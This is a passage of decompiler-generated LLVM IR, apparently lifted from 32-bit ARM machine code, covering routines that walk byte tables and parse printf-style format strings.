bb:                                               ; preds = %dec_label_pc_e1c8
  %v2_e1cc = add i32 %v0_e08c, 36
  %v3_e1cc = inttoptr i32 %v2_e1cc to i8*
  %v4_e1cc = load i8, i8* %v3_e1cc, align 1
  %v5_e1cc = zext i8 %v4_e1cc to i32
  %v5_e1d0 = mul nuw nsw i32 %v5_e1cc, 8
  %v6_e1d0 = add i32 %v5_e1d0, %v1_e098
  store i32 %v6_e1d0, i32* %r3.global-to-local, align 4
  %v2_e1d4 = add i32 %v6_e1d0, -8
  %v3_e1d4 = inttoptr i32 %v2_e1d4 to i32*
  %v4_e1d4 = load i32, i32* %v3_e1d4, align 4
  store i32 %v4_e1d4, i32* %r3.global-to-local, align 4
  store i32 %v4_e1d4, i32* %v2_e09c, align 4
  %v0_e1dc.pre = load i32, i32* @r0, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_e1c8, %bb
  %v2_e1f0 = phi i32 [ %v0_e1dc.pre, %bb ], [ %v0_e08c, %dec_label_pc_e1c8 ]
  %v1_e1dc = add i32 %v2_e1f0, 4
  %v2_e1dc = inttoptr i32 %v1_e1dc to i32*
  %v3_e1dc = load i32, i32* %v2_e1dc, align 4
  store i32 %v3_e1dc, i32* %r3.global-to-local, align 4
  %v6_e1e0 = icmp eq i32 %v3_e1dc, -2147483648
  br i1 %v6_e1e0, label %bb15, label %dec_label_pc_e1c4

bb15:                                             ; preds = %.thread2
  %v2_e1e4 = add i32 %v2_e1f0, 37
  %v3_e1e4 = inttoptr i32 %v2_e1e4 to i8*
  %v4_e1e4 = load i8, i8* %v3_e1e4, align 1
  %v5_e1e4 = zext i8 %v4_e1e4 to i32
  %v1_e1e8 = load i32, i32* %ip.global-to-local, align 4
  %v5_e1e8 = mul nuw nsw i32 %v5_e1e4, 8
  %v6_e1e8 = add i32 %v5_e1e8, %v1_e1e8
  store i32 %v6_e1e8, i32* %r3.global-to-local, align 4
  %v2_e1ec = add i32 %v6_e1e8, -8
  %v3_e1ec = inttoptr i32 %v2_e1ec to i32*
  %v4_e1ec = load i32, i32* %v3_e1ec, align 4
  store i32 %v4_e1ec, i32* %r3.global-to-local, align 4
  store i32 %v4_e1ec, i32* %v2_e1dc, align 4
  %v0_e1f4.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_e1c4

dec_label_pc_e1b8.dec_label_pc_e1c4.loopexit_crit_edge: ; preds = %dec_label_pc_e1b4
  br label %dec_label_pc_e1c4.loopexit

dec_label_pc_e1c4.loopexit:                       ; preds = %dec_label_pc_e1b8.dec_label_pc_e1c4.loopexit_crit_edge, %dec_label_pc_e0e8
  %v0_e1b8.lcssa = phi i32 [ %v0_e1b8, %dec_label_pc_e1b8.dec_label_pc_e1c4.loopexit_crit_edge ], [ %v0_e1b818, %dec_label_pc_e0e8 ]
  br label %dec_label_pc_e1c4

dec_label_pc_e1c4:                                ; preds = %dec_label_pc_e1c4.loopexit, %.thread2, %bb15
  %v1_e214 = phi i32 [ %v0_e1b8.lcssa, %dec_label_pc_e1c4.loopexit ], [ %v2_e1f0, %.thread2 ], [ %v0_e1f4.pre, %bb15 ]
  %v1_e1f4 = add i32 %v1_e214, 8
  %v2_e1f4 = inttoptr i32 %v1_e1f4 to i32*
  %v3_e1f4 = load i32, i32* %v2_e1f4, align 4
  store i32 %v3_e1f4, i32* %r1.global-to-local, align 4
  %v1_e1f8 = icmp slt i32 %v3_e1f4, 0
  br i1 %v1_e1f8, label %bb17, label %bb16

bb16:                                             ; preds = %dec_label_pc_e1c4
  %v5_e1fc = load i32, i32* %stack_var_-8, align 4
  store i32 %v5_e1fc, i32* @r4, align 4
  ret i32 %v1_e214

bb17:                                             ; preds = %dec_label_pc_e1c4
  %v1_e200 = add i32 %v1_e214, 16
  %v2_e200 = inttoptr i32 %v1_e200 to i32*
  %v3_e200 = load i32, i32* %v2_e200, align 4
  %v1_e208 = sub i32 0, %v3_e1f4
  store i32 %v1_e208, i32* %r1.global-to-local, align 4
  %v1_e204 = and i32 %v3_e200, -10
  %v1_e20c = or i32 %v1_e204, 8
  store i32 %v1_e20c, i32* %r3.global-to-local, align 4
  store i32 32, i32* %r2.global-to-local, align 4
  %v2_e214 = add i32 %v1_e214, 20
  %v3_e214 = inttoptr i32 %v2_e214 to i32*
  store i32 32, i32* %v3_e214, align 4
  %v0_e218 = load i32, i32* %r1.global-to-local, align 4
  %v1_e218 = load i32, i32* @r0, align 4
  %v2_e218 = add i32 %v1_e218, 8
  %v3_e218 = inttoptr i32 %v2_e218 to i32*
  store i32 %v0_e218, i32* %v3_e218, align 4
  %v0_e21c = load i32, i32* %r3.global-to-local, align 4
  %v1_e21c = load i32, i32* @r0, align 4
  %v2_e21c = add i32 %v1_e21c, 16
  %v3_e21c = inttoptr i32 %v2_e21c to i32*
  store i32 %v0_e21c, i32* %v3_e21c, align 4
  %v2_e220 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_e220, i32* @r4, align 4
  %v8_e220 = load i32, i32* @r0, align 4
  ret i32 %v8_e220

; uselistorder directives
  uselistorder i32 %v1_e1b4, { 2, 1, 0 }
  uselistorder i32 %v0_e1b8, { 1, 2, 0 }
  uselistorder i32 %v3_e188, { 0, 2, 1, 3 }
  uselistorder i32 %v3_e100, { 3, 1, 0, 2, 4 }
  uselistorder i32* %v2_e100, { 4, 2, 3, 0, 1, 5 }
  uselistorder i32 %v3_e0f4, { 1, 2, 0, 8, 5, 3, 4, 7, 6, 9, 10, 11 }
  uselistorder i32 %v1_e0f024, { 1, 0 }
  uselistorder i32 %v0_e1b818, { 2, 0, 1 }
  uselistorder i32 %v0_e08c, { 0, 3, 1, 2, 5, 4, 6 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 16, 7, 8, 9, 10, 11, 12, 13, 14, 15, 23, 17, 18, 19, 20, 21, 22 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9 }
  uselistorder i32* %ip.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder label %dec_label_pc_e1c4, { 0, 2, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_e1b4, { 1, 0 }
  uselistorder label %dec_label_pc_e1b0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_e1a0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_e188, { 1, 0 }
  uselistorder label %dec_label_pc_e174, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_e0f0, { 1, 0 }
  uselistorder label %dec_label_pc_e0e8, { 1, 0 }
  uselistorder label %dec_label_pc_e0c4, { 1, 0 }
}

define i32 @function_e228() local_unnamed_addr {
dec_label_pc_e228:
  %v1_e240.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_e22c

dec_label_pc_e22c:                                ; preds = %dec_label_pc_e248, %dec_label_pc_e228
  %v0_e22c = phi i32 [ %v1_e22c, %dec_label_pc_e248 ], [ ptrtoint (i32* @global_var_162e8.354 to i32), %dec_label_pc_e228 ]
  %v1_e22c = add i32 %v0_e22c, -2
  %v1_e230 = add i32 %v0_e22c, -1
  %v2_e230 = inttoptr i32 %v1_e230 to i8*
  %v3_e230 = load i8, i8* %v2_e230, align 1
  %v4_e230 = zext i8 %v3_e230 to i32
  %v1_e234 = inttoptr i32 %v1_e22c to i8*
  %v2_e234 = load i8, i8* %v1_e234, align 2
  %v3_e234 = zext i8 %v2_e234 to i32
  %v3_e238 = mul nuw i32 %v4_e230, 16777216
  %v4_e23c = sdiv i32 %v3_e238, 65536
  %v5_e23c = or i32 %v4_e23c, %v3_e234
  %v9_e240 = icmp eq i32 %v5_e23c, %v1_e240.pre
  br i1 %v9_e240, label %dec_label_pc_e22c.dec_label_pc_e254_crit_edge, label %dec_label_pc_e248

dec_label_pc_e22c.dec_label_pc_e254_crit_edge:    ; preds = %dec_label_pc_e22c
  br label %dec_label_pc_e254

dec_label_pc_e248:                                ; preds = %dec_label_pc_e22c
  %tmp = icmp ugt i32 %v1_e22c, ptrtoint (i32* @global_var_162d0.356 to i32)
  br i1 %tmp, label %dec_label_pc_e22c, label %dec_label_pc_e254

dec_label_pc_e254:                                ; preds = %dec_label_pc_e248, %dec_label_pc_e22c.dec_label_pc_e254_crit_edge
  %v2_e25c.pre-phi = sub i32 %v1_e22c, ptrtoint (i32* @global_var_162d0.356 to i32)
  store i32 ptrtoint (i32* @global_var_162e8.354 to i32), i32* @r2, align 4
  %v4_e260 = sdiv i32 %v2_e25c.pre-phi, 2
  %v5_e260 = add i32 %v4_e260, ptrtoint (i32* @global_var_162e8.354 to i32)
  %v6_e260 = inttoptr i32 %v5_e260 to i8*
  %v7_e260 = load i8, i8* %v6_e260, align 1
  %v9_e260 = zext i8 %v7_e260 to i32
  ret i32 %v9_e260

; uselistorder directives
  uselistorder i32 %v1_e22c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_e22c, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_162e8.354 to i32), { 1, 2, 0 }
}

define i32 @function_e274(i32* %arg1) local_unnamed_addr {
dec_label_pc_e274:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %tmp106 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-87 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_e274 = load i32, i32* @r4, align 4
  store i32 %v3_e274, i32* %stack_var_-32, align 4
  %v6_e274 = load i32, i32* @r5, align 4
  %v25_e274 = ptrtoint i32* %stack_var_-32 to i32
  %v1_e278 = add i32 %tmp, 16
  %v2_e278 = inttoptr i32 %v1_e278 to i32*
  %v3_e278 = load i32, i32* %v2_e278, align 4
  %v2_e27c = ptrtoint i32* %stack_var_-88 to i32
  %v1_e280 = and i32 %v3_e278, 128
  store i32 %v1_e280, i32* @r4, align 4
  %v2_e280 = icmp eq i32 %v1_e280, 0
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r7.global-to-local, align 4
  %v1_e2a0 = add i32 %tmp, 24
  %v2_e2a0 = inttoptr i32 %v1_e2a0 to i32*
  %v3_e2a0 = load i32, i32* %v2_e2a0, align 4
  store i32 %v3_e2a0, i32* %sb.global-to-local, align 4
  br i1 %v2_e280, label %bb, label %dec_label_pc_e2c0

bb:                                               ; preds = %dec_label_pc_e274
  %v3_e2a4 = load i32, i32* %arg1, align 4
  br label %dec_label_pc_e30c

dec_label_pc_e2b0:                                ; preds = %dec_label_pc_e490
  %v0_e2b0 = load i32, i32* %r0.global-to-local, align 4
  %v0_e4c0.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_e4b8

dec_label_pc_e2b8:                                ; preds = %dec_label_pc_e4bc
  %v1_e2b8 = add i32 %v0_e4c0.pre, 1
  store i32 %v1_e2b8, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_e4d8

dec_label_pc_e2c0:                                ; preds = %dec_label_pc_e274
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e2c4

dec_label_pc_e2c4:                                ; preds = %dec_label_pc_e2f8.dec_label_pc_e2c4_crit_edge, %dec_label_pc_e2c0
  %v1_e2d4 = phi i32 [ %v1_e2e8, %dec_label_pc_e2f8.dec_label_pc_e2c4_crit_edge ], [ 0, %dec_label_pc_e2c0 ]
  %v0_e2c4 = phi i32 [ %v0_e2c4.pre, %dec_label_pc_e2f8.dec_label_pc_e2c4_crit_edge ], [ %tmp, %dec_label_pc_e2c0 ]
  %v1_e2c4 = inttoptr i32 %v0_e2c4 to i32*
  %v2_e2c4 = load i32, i32* %v1_e2c4, align 4
  %v4_e2c8 = mul i32 %v1_e2d4, 4
  %v5_e2c8 = add i32 %v2_e2c4, %v4_e2c8
  store i32 %v5_e2c8, i32* %r3.global-to-local, align 4
  %v1_e2cc = add i32 %v5_e2c8, -4
  %v2_e2cc = inttoptr i32 %v1_e2cc to i32*
  %v3_e2cc = load i32, i32* %v2_e2cc, align 4
  store i32 %v3_e2cc, i32* %r1.global-to-local, align 4
  store i32 %v25_e274, i32* @ip, align 4
  %v2_e2d4 = add i32 %v1_e2d4, %v25_e274
  store i32 %v2_e2d4, i32* %r2.global-to-local, align 4
  %v1_e2d8 = trunc i32 %v3_e2cc to i8
  %v3_e2d8 = add i32 %v2_e2d4, -56
  %v4_e2d8 = inttoptr i32 %v3_e2d8 to i8*
  store i8 %v1_e2d8, i8* %v4_e2d8, align 1
  %v0_e2dc = load i32, i32* %r2.global-to-local, align 4
  %v1_e2dc = add i32 %v0_e2dc, -56
  %v2_e2dc = inttoptr i32 %v1_e2dc to i8*
  %v3_e2dc = load i8, i8* %v2_e2dc, align 1
  %v4_e2dc = zext i8 %v3_e2dc to i32
  store i32 %v4_e2dc, i32* %r2.global-to-local, align 4
  %v0_e2e0 = load i32, i32* %r3.global-to-local, align 4
  %v1_e2e0 = add i32 %v0_e2e0, -4
  %v2_e2e0 = inttoptr i32 %v1_e2e0 to i32*
  %v3_e2e0 = load i32, i32* %v2_e2e0, align 4
  store i32 %v3_e2e0, i32* %r3.global-to-local, align 4
  %v9_e2e4 = icmp eq i32 %v4_e2dc, %v3_e2e0
  %v0_e2e8 = load i32, i32* %r0.global-to-local, align 4
  %v1_e2e8 = add i32 %v0_e2e8, 1
  store i32 %v1_e2e8, i32* %r0.global-to-local, align 4
  br i1 %v9_e2e4, label %dec_label_pc_e2f0, label %dec_label_pc_e708

dec_label_pc_e2f0:                                ; preds = %dec_label_pc_e2c4
  %v2_e2f0 = icmp eq i8 %v3_e2dc, 0
  br i1 %v2_e2f0, label %dec_label_pc_e300, label %dec_label_pc_e2f8

dec_label_pc_e2f8:                                ; preds = %dec_label_pc_e2f0
  %tmp166 = icmp ult i32 %v1_e2e8, 32
  br i1 %tmp166, label %dec_label_pc_e2f8.dec_label_pc_e2c4_crit_edge, label %dec_label_pc_e300

dec_label_pc_e2f8.dec_label_pc_e2c4_crit_edge:    ; preds = %dec_label_pc_e2f8
  %v0_e2c4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_e2c4

dec_label_pc_e300:                                ; preds = %dec_label_pc_e2f8, %dec_label_pc_e2f0
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_e308 = ptrtoint i32* %stack_var_-87 to i32
  br label %dec_label_pc_e30c

dec_label_pc_e30c:                                ; preds = %bb, %dec_label_pc_e300
  %storemerge102 = phi i32 [ %v2_e308, %dec_label_pc_e300 ], [ %v3_e2a4, %bb ]
  store i32 %storemerge102, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  br label %dec_label_pc_e31c

dec_label_pc_e318:                                ; preds = %.thread22, %dec_label_pc_e428
  %v0_e318 = phi i32 [ %v2_e4a0, %.thread22 ], [ %storemerge105, %dec_label_pc_e428 ]
  %stack_var_-48.0 = phi i32 [ %stack_var_-48.3, %.thread22 ], [ %stack_var_-48.2, %dec_label_pc_e428 ]
  store i32 %v0_e318, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_e31c

dec_label_pc_e31c:                                ; preds = %dec_label_pc_e30c, %dec_label_pc_e318
  %v1_e338 = phi i32 [ %storemerge102, %dec_label_pc_e30c ], [ %v0_e318, %dec_label_pc_e318 ]
  %stack_var_-48.1 = phi i32 [ %tmp106, %dec_label_pc_e30c ], [ %stack_var_-48.0, %dec_label_pc_e318 ]
  %v1_e31c = inttoptr i32 %v1_e338 to i8*
  %v2_e31c = load i8, i8* %v1_e31c, align 1
  %v3_e31c = zext i8 %v2_e31c to i32
  store i32 %v3_e31c, i32* %r3.global-to-local, align 4
  %v7_e320 = icmp eq i8 %v2_e31c, 42
  br i1 %v7_e320, label %bb124, label %.thread9.thread

.thread9.thread:                                  ; preds = %dec_label_pc_e31c
  store i32 %v1_e338, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.preheader

bb124:                                            ; preds = %dec_label_pc_e31c
  %v1_e32c = load i32, i32* @lr, align 4
  %v4_e32c = mul i32 %v1_e32c, -4
  %v5_e32c = add i32 %v4_e32c, %v25_e274
  store i32 %v5_e32c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_e338 = add i32 %v1_e338, 1
  store i32 %v2_e338, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_e340 = add i32 %v5_e32c, -12
  %v4_e340 = inttoptr i32 %v3_e340 to i32*
  store i32 0, i32* %v4_e340, align 4
  %v0_e364.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %bb124, %.thread9.thread
  %v0_e364.pre = phi i32 [ %v0_e364.pre.pre, %bb124 ], [ %v1_e338, %.thread9.thread ]
  %v2_e368.pre = load i32, i32* @global_var_18428, align 4
  br label %.backedge

dec_label_pc_e348:                                ; preds = %.backedge
  store i32 4094, i32* %r3.global-to-local, align 4
  %v0_e34c = load i32, i32* %r0.global-to-local, align 4
  %v7_e350 = icmp sgt i32 %v0_e34c, 4094
  br i1 %v7_e350, label %.thread12, label %bb126

.thread12:                                        ; preds = %dec_label_pc_e348
  %v1_e35814 = add i32 %v0_e3dc, 1
  store i32 %v1_e35814, i32* %r6.global-to-local, align 4
  br label %.backedge

bb126:                                            ; preds = %dec_label_pc_e348
  %v11_e354 = mul i32 %v0_e34c, 10
  %v12_e354 = add i32 %v11_e354, %v3_e364
  store i32 %v12_e354, i32* %r3.global-to-local, align 4
  %v1_e358 = add i32 %v0_e3dc, 1
  store i32 %v1_e358, i32* %r6.global-to-local, align 4
  %v9_e35c = add i32 %v12_e354, -48
  store i32 %v9_e35c, i32* %r0.global-to-local, align 4
  br label %.backedge

.backedge:                                        ; preds = %.thread12, %bb126, %.preheader
  %v0_e3dc = phi i32 [ %v0_e364.pre, %.preheader ], [ %v1_e358, %bb126 ], [ %v1_e35814, %.thread12 ]
  store i32 99368, i32* %r3.global-to-local, align 4
  %v1_e364 = inttoptr i32 %v0_e3dc to i8*
  %v2_e364 = load i8, i8* %v1_e364, align 1
  %v3_e364 = zext i8 %v2_e364 to i32
  store i32 %v3_e364, i32* %r2.global-to-local, align 4
  store i32 %v2_e368.pre, i32* %r3.global-to-local, align 4
  %v3_e36c = mul nuw nsw i32 %v3_e364, 2
  %v4_e36c = add i32 %v3_e36c, %v2_e368.pre
  %v5_e36c = inttoptr i32 %v4_e36c to i8*
  %v6_e36c = load i8, i8* %v5_e36c, align 1
  %v8_e36c = zext i8 %v6_e36c to i32
  store i32 %v8_e36c, i32* %r3.global-to-local, align 4
  %v1_e370 = and i32 %v8_e36c, 8
  %v2_e370 = icmp eq i32 %v1_e370, 0
  br i1 %v2_e370, label %dec_label_pc_e378, label %dec_label_pc_e348

dec_label_pc_e378:                                ; preds = %.backedge
  %v0_e378 = load i32, i32* %r1.global-to-local, align 4
  %v1_e378 = add i32 %v0_e378, -1
  %v2_e378 = inttoptr i32 %v1_e378 to i8*
  %v3_e378 = load i8, i8* %v2_e378, align 1
  %v4_e378 = zext i8 %v3_e378 to i32
  store i32 %v4_e378, i32* %r3.global-to-local, align 4
  %v7_e37c = icmp eq i8 %v3_e378, 37
  br i1 %v7_e37c, label %dec_label_pc_e384, label %dec_label_pc_e440

dec_label_pc_e384:                                ; preds = %dec_label_pc_e378
  %v7_e384 = icmp eq i8 %v2_e364, 36
  %. = zext i1 %v7_e384 to i32
  store i32 %., i32* @ip, align 4
  %v0_e390 = load i32, i32* %r0.global-to-local, align 4
  %tmp129 = icmp slt i32 %v0_e390, 1
  br i1 %tmp129, label %bb130, label %thread-pre-split

bb130:                                            ; preds = %dec_label_pc_e384
  store i32 0, i32* @ip, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_e384, %bb130
  %v1_e3ec = phi i32 [ 0, %bb130 ], [ %., %dec_label_pc_e384 ]
  %v2_e398 = icmp eq i32 %v1_e3ec, 0
  %v0_e3c8 = load i32, i32* %sb.global-to-local, align 4
  br i1 %v2_e398, label %dec_label_pc_e3c8, label %dec_label_pc_e3a0

dec_label_pc_e3a0:                                ; preds = %thread-pre-split
  %v2_e3c8 = icmp eq i32 %v0_e3c8, 0
  %v1_e3a4 = add i32 %v0_e3dc, 1
  store i32 %v1_e3a4, i32* %r1.global-to-local, align 4
  br i1 %v2_e3c8, label %dec_label_pc_e708, label %dec_label_pc_e3ac

dec_label_pc_e3ac:                                ; preds = %dec_label_pc_e3a0
  %v2_e3ac = sub i32 %v0_e390, %v0_e3c8
  %v4_e3ac = xor i32 %v0_e3c8, %v0_e390
  %v5_e3ac = xor i32 %v2_e3ac, %v0_e390
  %v6_e3ac = and i32 %v5_e3ac, %v4_e3ac
  %v7_e3ac = icmp slt i32 %v6_e3ac, 0
  %v8_e3ac = icmp slt i32 %v2_e3ac, 0
  %v9_e3ac = icmp eq i32 %v0_e390, %v0_e3c8
  %v3_e3b0 = xor i1 %v8_e3ac, %v7_e3ac
  %v4_e3b0 = or i1 %v9_e3ac, %v3_e3b0
  br i1 %v4_e3b0, label %dec_label_pc_e3c0, label %bb131

bb131:                                            ; preds = %dec_label_pc_e3ac
  store i32 %v0_e390, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_e3c0

dec_label_pc_e3bc:                                ; preds = %dec_label_pc_e3dc, %dec_label_pc_e3e4
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_e3c0

dec_label_pc_e3c0:                                ; preds = %bb131, %dec_label_pc_e3ac, %dec_label_pc_e3bc
  %v0_e3c0 = phi i32 [ %v0_e378, %dec_label_pc_e3bc ], [ %v1_e3a4, %dec_label_pc_e3ac ], [ %v1_e3a4, %bb131 ]
  %stack_var_-48.2 = phi i32 [ %stack_var_-48.1, %dec_label_pc_e3bc ], [ %v0_e390, %dec_label_pc_e3ac ], [ %v0_e390, %bb131 ]
  br label %dec_label_pc_e3f8

dec_label_pc_e3c8:                                ; preds = %thread-pre-split
  %tmp132 = icmp slt i32 %v0_e3c8, 1
  br i1 %tmp132, label %dec_label_pc_e3dc, label %dec_label_pc_e3d0

dec_label_pc_e3d0:                                ; preds = %dec_label_pc_e3c8
  %v7_e3d0 = icmp eq i8 %v2_e364, 109
  br i1 %v7_e3d0, label %dec_label_pc_e440, label %dec_label_pc_e708

dec_label_pc_e3dc:                                ; preds = %dec_label_pc_e3c8
  %tmp167 = icmp ugt i32 %v0_e3dc, %v0_e378
  br i1 %tmp167, label %dec_label_pc_e3e4, label %dec_label_pc_e3bc

dec_label_pc_e3e4:                                ; preds = %dec_label_pc_e3dc
  %v1_e3e4 = inttoptr i32 %v0_e378 to i8*
  %v2_e3e4 = load i8, i8* %v1_e3e4, align 1
  %v3_e3e4 = zext i8 %v2_e3e4 to i32
  store i32 %v3_e3e4, i32* %r3.global-to-local, align 4
  %v7_e3e8 = icmp eq i8 %v2_e3e4, 48
  br i1 %v7_e3e8, label %dec_label_pc_e3bc, label %bb133

bb133:                                            ; preds = %dec_label_pc_e3e4
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_e440

dec_label_pc_e3f8.loopexit:                       ; preds = %dec_label_pc_e400
  %v1_e40c = load i32, i32* @r4, align 4
  %v3_e40c = or i32 %v1_e40c, %v0_e420
  store i32 %v3_e40c, i32* @r4, align 4
  %v2_e410 = add i32 %storemerge105, 1
  br label %dec_label_pc_e3f8

dec_label_pc_e3f8:                                ; preds = %dec_label_pc_e3f8.loopexit, %dec_label_pc_e3c0
  %storemerge105 = phi i32 [ %v0_e3c0, %dec_label_pc_e3c0 ], [ %v2_e410, %dec_label_pc_e3f8.loopexit ]
  store i32 %storemerge105, i32* %r6.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_162c8.363 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_e404 = inttoptr i32 %storemerge105 to i8*
  br label %dec_label_pc_e400

dec_label_pc_e400:                                ; preds = %dec_label_pc_e418, %dec_label_pc_e3f8
  %v0_e420 = phi i32 [ %v2_e420, %dec_label_pc_e418 ], [ 1, %dec_label_pc_e3f8 ]
  %v0_e400 = phi i32 [ %v5_e400, %dec_label_pc_e418 ], [ ptrtoint ([8 x i8]* @global_var_162c8.363 to i32), %dec_label_pc_e3f8 ]
  %v1_e400 = inttoptr i32 %v0_e400 to i8*
  %v2_e400 = load i8, i8* %v1_e400, align 1
  %v3_e400 = zext i8 %v2_e400 to i32
  store i32 %v3_e400, i32* %r2.global-to-local, align 4
  %v5_e400 = add i32 %v0_e400, 1
  store i32 %v5_e400, i32* %r1.global-to-local, align 4
  %v2_e404 = load i8, i8* %v1_e404, align 1
  %v3_e404 = zext i8 %v2_e404 to i32
  store i32 %v3_e404, i32* %r3.global-to-local, align 4
  %v9_e408 = icmp eq i8 %v2_e404, %v2_e400
  br i1 %v9_e408, label %dec_label_pc_e3f8.loopexit, label %dec_label_pc_e418

dec_label_pc_e418:                                ; preds = %dec_label_pc_e400
  %v1_e418 = inttoptr i32 %v5_e400 to i8*
  %v2_e418 = load i8, i8* %v1_e418, align 1
  %v3_e418 = zext i8 %v2_e418 to i32
  store i32 %v3_e418, i32* %r3.global-to-local, align 4
  %v2_e41c = icmp eq i8 %v2_e418, 0
  %v2_e420 = mul i32 %v0_e420, 2
  store i32 %v2_e420, i32* %r0.global-to-local, align 4
  br i1 %v2_e41c, label %dec_label_pc_e428, label %dec_label_pc_e400

dec_label_pc_e428:                                ; preds = %dec_label_pc_e418
  %v1_e428 = add i32 %storemerge105, -1
  %v2_e428 = inttoptr i32 %v1_e428 to i8*
  %v3_e428 = load i8, i8* %v2_e428, align 1
  %v7_e42c = icmp eq i8 %v3_e428, 37
  %v0_e430 = load i32, i32* @r4, align 4
  %v1_e430 = and i32 %v0_e430, 10
  store i32 %v1_e430, i32* %r3.global-to-local, align 4
  %v4_e434 = udiv i32 %v1_e430, 2
  %v5_e434 = sub nuw nsw i32 -1, %v4_e434
  %v6_e434 = and i32 %v0_e430, %v5_e434
  store i32 %v6_e434, i32* @r4, align 4
  br i1 %v7_e42c, label %dec_label_pc_e43c, label %dec_label_pc_e318

dec_label_pc_e43c:                                ; preds = %dec_label_pc_e428
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e440

dec_label_pc_e440:                                ; preds = %bb133, %dec_label_pc_e378, %dec_label_pc_e3d0, %dec_label_pc_e43c
  %v1_e484 = phi i32 [ %storemerge105, %dec_label_pc_e43c ], [ %v0_e3dc, %bb133 ], [ %v0_e3dc, %dec_label_pc_e3d0 ], [ %v0_e3dc, %dec_label_pc_e378 ]
  %v0_e480 = phi i32 [ %v5_e400, %dec_label_pc_e43c ], [ %v0_e378, %bb133 ], [ %v0_e378, %dec_label_pc_e3d0 ], [ %v0_e378, %dec_label_pc_e378 ]
  %stack_var_-48.3 = phi i32 [ %stack_var_-48.2, %dec_label_pc_e43c ], [ %stack_var_-48.1, %bb133 ], [ %stack_var_-48.1, %dec_label_pc_e3d0 ], [ %stack_var_-48.1, %dec_label_pc_e378 ]
  %v1_e440 = inttoptr i32 %v0_e480 to i8*
  %v2_e440 = load i8, i8* %v1_e440, align 1
  %v3_e440 = zext i8 %v2_e440 to i32
  store i32 %v3_e440, i32* %r3.global-to-local, align 4
  %v7_e444 = icmp eq i8 %v2_e440, 42
  br i1 %v7_e444, label %dec_label_pc_e44c, label %dec_label_pc_e490

dec_label_pc_e44c:                                ; preds = %dec_label_pc_e440
  %v0_e44c = load i32, i32* %sb.global-to-local, align 4
  %v2_e44c = icmp eq i32 %v0_e44c, 0
  br i1 %v2_e44c, label %dec_label_pc_e480, label %dec_label_pc_e454

dec_label_pc_e454:                                ; preds = %dec_label_pc_e44c
  %v1_e454 = inttoptr i32 %v1_e484 to i8*
  %v2_e454 = load i8, i8* %v1_e454, align 1
  %v3_e454 = zext i8 %v2_e454 to i32
  store i32 %v3_e454, i32* %r3.global-to-local, align 4
  %v7_e458 = icmp eq i8 %v2_e454, 36
  br i1 %v7_e458, label %dec_label_pc_e460, label %dec_label_pc_e708

dec_label_pc_e460:                                ; preds = %dec_label_pc_e454
  %v0_e460 = load i32, i32* %r0.global-to-local, align 4
  %tmp134 = icmp slt i32 %v0_e460, 1
  br i1 %tmp134, label %dec_label_pc_e708, label %dec_label_pc_e468

dec_label_pc_e468:                                ; preds = %dec_label_pc_e460
  store i32 %v25_e274, i32* %r1.global-to-local, align 4
  %v0_e470 = load i32, i32* @lr, align 4
  %v3_e470 = mul i32 %v0_e470, -4
  %v4_e470 = add i32 %v3_e470, %v25_e274
  store i32 %v4_e470, i32* %r3.global-to-local, align 4
  %v1_e474 = add i32 %v1_e484, 1
  store i32 %v1_e474, i32* %r6.global-to-local, align 4
  %v2_e478 = add i32 %v4_e470, -24
  %v3_e478 = inttoptr i32 %v2_e478 to i32*
  store i32 %v0_e460, i32* %v3_e478, align 4
  br label %dec_label_pc_e48c

dec_label_pc_e480:                                ; preds = %dec_label_pc_e44c
  %v1_e480 = add i32 %v0_e480, 1
